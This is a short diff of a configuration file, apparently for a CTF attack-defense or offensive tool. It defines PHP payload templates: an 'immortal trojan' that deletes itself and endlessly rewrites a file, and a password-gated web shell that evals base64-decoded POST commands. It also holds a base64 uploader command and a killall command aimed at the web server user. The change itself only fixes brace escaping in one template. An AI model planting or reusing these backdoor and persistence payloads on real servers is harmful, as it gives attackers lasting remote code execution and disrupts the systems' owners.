@@ -41,7 +41,7 @@
             "uploader": "/bin/echo '{0}' | /usr/bin/base64 -d > {1}",
             "killer": "killall -uwww-data",
             "tpl": {
-                "immortalTroj": "<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);while (1){file_put_contents('{1}',base64_decode('{0}'));usleep(1000);}}?>",
+                "immortalTroj": "<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);while (1){{file_put_contents('{1}',base64_decode('{0}'));usleep(1000);}}?>",
                 "subTroj": "<?php echo 'your id:' . md5($_GET['{0}']) . '-to-{1}';if (md5($_GET['{0}'])==='{1}'){{$tmp=base64_decode($_POST['cmd']);@eval($tmp);}}?>"
             }
         },
